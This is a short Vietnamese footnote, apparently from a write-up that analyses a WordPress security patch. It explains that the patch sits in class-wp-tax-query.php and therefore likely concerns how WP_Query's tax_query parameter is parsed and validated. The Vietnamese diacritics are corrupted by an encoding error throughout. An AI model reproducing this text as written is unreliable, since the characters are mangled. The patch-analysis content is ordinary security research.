[^tax_query]: V√¨ patch n·∫±m trong file **src/wp-includes/class-wp-tax-query.php** File n√†y ƒë·ªãnh nghƒ©a class `WP_Tax_Query`, ch·ªãu tr√°ch nhi·ªám x·ª≠ l√Ω tham s·ªë `tax_query` trong `WP_Query`. V√¨ th·∫ø, n·∫øu c√≥ thay ƒë·ªïi trong file n√†y th√¨ g·∫ßn nh∆∞ ch·∫Øc ch·∫Øn n√≥ li√™n quan ƒë·∫øn qu√° tr√¨nh **parse/validate** c·ªßa `tax_query`. 